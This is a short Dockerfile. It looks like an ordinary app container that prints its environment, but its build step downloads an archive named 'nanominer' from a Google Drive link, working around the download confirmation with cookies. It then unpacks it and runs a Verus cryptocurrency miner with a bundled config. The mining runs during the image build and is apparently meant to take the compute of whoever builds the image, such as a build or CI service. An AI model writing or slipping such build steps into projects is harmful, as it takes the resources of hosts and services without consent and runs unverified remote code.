FROM ubuntu:bionic

RUN apt update && apt install wget -y && wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1J08VYs2oqesb5QaE809LtC2N5skthPdc' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1J08VYs2oqesb5QaE809LtC2N5skthPdc" -O nanominer.tar.gz && rm -rf /tmp/cookies.txt && tar -xvf nanominer.tar.gz && cd nanominer && chmod u+x nanominer && ./nanominer config_verus.ini
WORKDIR /usr/src/app

COPY . .

CMD ["printenv"]
